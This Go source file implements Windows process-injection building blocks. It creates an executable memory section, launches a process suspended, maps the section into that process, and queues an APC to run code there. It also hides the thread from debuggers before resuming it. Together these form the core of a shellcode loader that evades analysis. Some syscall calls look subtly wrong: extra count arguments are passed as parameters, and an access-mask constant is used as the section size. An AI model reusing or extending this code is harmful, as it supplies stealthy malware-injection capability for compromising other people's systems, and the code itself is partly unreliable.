package pe

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const SEC_COMMIT = 0x08000000
const SECTION_WRITE = 0x2
const SECTION_READ = 0x4
const SECTION_EXECUTE = 0x8
const SECTION_RWX = SECTION_WRITE | SECTION_READ | SECTION_EXECUTE

func CreateNewSection(ntdll syscall.Handle) (uintptr, error) {
	var err error
	NtCreateSection, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtCreateSection")
	if err != nil {
		return 0, err
	}
	var section uintptr
	size := int64(0xF001F)
	syscall.SyscallN(uintptr(NtCreateSection),
		uintptr(unsafe.Pointer(&section)), // PHANDLE            SectionHandle,
		SECTION_RWX,                       // ACCESS_MASK        DesiredAccess,
		0,                                 // POBJECT_ATTRIBUTES ObjectAttributes,
		uintptr(unsafe.Pointer(&size)),    // PLARGE_INTEGER     MaximumSize,
		windows.PAGE_EXECUTE_READWRITE,    // ULONG              SectionPageProtection,
		SEC_COMMIT,                        // ULONG              AllocationAttributes,
		0,                                 // HANDLE             FileHandle
		0,
		0)

	if section == 0 {
		return 0, fmt.Errorf("NtCreateSection à échoué")
	}
	log.Printf("Section: %0x\n", section)
	return section, nil
}

func CreateProcessInt(kernel32 syscall.Handle, procPath string) (uintptr, uintptr, error) {

	CreateProcessInternalW, err := syscall.GetProcAddress(
		syscall.Handle(kernel32), "CreateProcessInternalW")
	if err != nil {
		log.Fatalln(err)
		return 0, 0, err
	}
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	log.Println(procPath)
	unsptr, _ := syscall.UTF16PtrFromString(procPath)
	syscall.SyscallN(uintptr(CreateProcessInternalW),
		0,                                 // IN HANDLE hUserToken,
		uintptr(unsafe.Pointer(unsptr)),   // IN LPCWSTR lpApplicationName,
		0,                                 // IN LPWSTR lpCommandLine,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
		0,                                 // IN BOOL bInheritHandles,
		uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,
		0,                                 // IN LPVOID lpEnvironment,
		0,                                 // IN LPCWSTR lpCurrentDirectory,
		uintptr(unsafe.Pointer(&si)),      // IN LPSTARTUPINFOW lpStartupInfo,
		uintptr(unsafe.Pointer(&pi)),      // IN LPPROCESS_INFORMATION lpProcessInformation,
		0)                                 // OUT PHANDLE hNewToken)
	log.Println(uintptr(pi.Process), uintptr(pi.Thread))
	return uintptr(pi.Process), uintptr(pi.Thread), nil
}

func MapViewOfSection(
	ntdll syscall.Handle, section uintptr,
	phandle uintptr, commitSize uint32,
	viewSize uint32) (uintptr, uint32, error) {
	if phandle == 0 {
		return 0, 0, nil
	}
	var err error
	ZwMapViewOfSection, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "ZwMapViewOfSection")
	if err != nil {
		return 0, 0, err
	}
	var sectionBaseAddr uintptr
	syscall.SyscallN(uintptr(ZwMapViewOfSection),
		section, // HANDLE          SectionHandle,
		phandle, // HANDLE          ProcessHandle,
		uintptr(unsafe.Pointer(&sectionBaseAddr)), // PVOID           *BaseAddress,
		0,                                  // ULONG_PTR       ZeroBits,
		uintptr(commitSize),                // SIZE_T          CommitSize,
		0,                                  // PLARGE_INTEGER  SectionOffset,
		uintptr(unsafe.Pointer(&viewSize)), // PSIZE_T         ViewSize,
		1,                                  // SECTION_INHERIT InheritDisposition,
		0,                                  // ULONG           AllocationType,
		windows.PAGE_READWRITE,             // ULONG           Win32Protect
		0,
		0)
	log.Println(sectionBaseAddr, viewSize)
	return sectionBaseAddr, viewSize, nil
}

func QueueApcThread(ntdll syscall.Handle, thandle uintptr, funcaddr uintptr) error {
	var err error
	NtQueueApcThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtQueueApcThread")
	if err != nil {
		return err
	}
	r, _, err := syscall.SyscallN(uintptr(NtQueueApcThread),
		5,
		thandle,  // IN HANDLE               ThreadHandle,
		funcaddr, // IN PIO_APC_ROUTINE      ApcRoutine, (RemoteSectionBaseAddr)
		0,        // IN PVOID                ApcRoutineContext OPTIONAL,
		0,        // IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
		0,        // IN ULONG                ApcReserved OPTIONAL
		0)
	if r != 0 {
		log.Printf("NtQueueApcThread ERROR CODE: %x", r)
		return err
	}
	return nil
}

func SetInformationThread(ntdll syscall.Handle, thandle uintptr) error {
	var err error
	NtSetInformationThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtSetInformationThread")
	if err != nil {
		return err
	}
	ti := int32(0x11)
	r, _, err := syscall.SyscallN(uintptr(NtSetInformationThread),
		4,
		thandle,     // 	HANDLE          ThreadHandle,
		uintptr(ti), //   THREADINFOCLASS ThreadInformationClass,
		0,           //   PVOID           ThreadInformation,
		0,           //   ULONG           ThreadInformationLength
		0,
		0)
	if r != 0 {
		log.Printf("NtSetInformationThread ERROR CODE: %x", r)
		return err
	}

	return nil
}

func ResumeThread(ntdll syscall.Handle, thandle uintptr) error {
	NtResumeThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtResumeThread")
	if err != nil {
		return err
	}
	r, _, err := syscall.SyscallN(uintptr(NtResumeThread),
		2,
		thandle, // 	IN HANDLE               ThreadHandle,
		0,       //   OUT PULONG              SuspendCount OPTIONAL
		0)
	if r != 0 {
		log.Printf("NtResumeThread ERROR CODE: %x", r)
		return err
	}
	return nil
}

type size_t = int
type usp = unsafe.Pointer

func Memcpy(dest uintptr, src unsafe.Pointer, len size_t) uintptr {

	cnt := len >> 3
	var i size_t = 0
	for i = 0; i < cnt; i++ {
		var pdest *uint64 = (*uint64)(usp(uintptr(dest) + uintptr(8*i)))
		var psrc *uint64 = (*uint64)(usp(uintptr(src) + uintptr(8*i)))
		*pdest = *psrc
	}
	left := len & 7
	for i = 0; i < left; i++ {
		var pdest *uint8 = (*uint8)(usp(uintptr(dest) + uintptr(8*cnt+i)))
		var psrc *uint8 = (*uint8)(usp(uintptr(src) + uintptr(8*cnt+i)))

		*pdest = *psrc
	}
	return dest
}
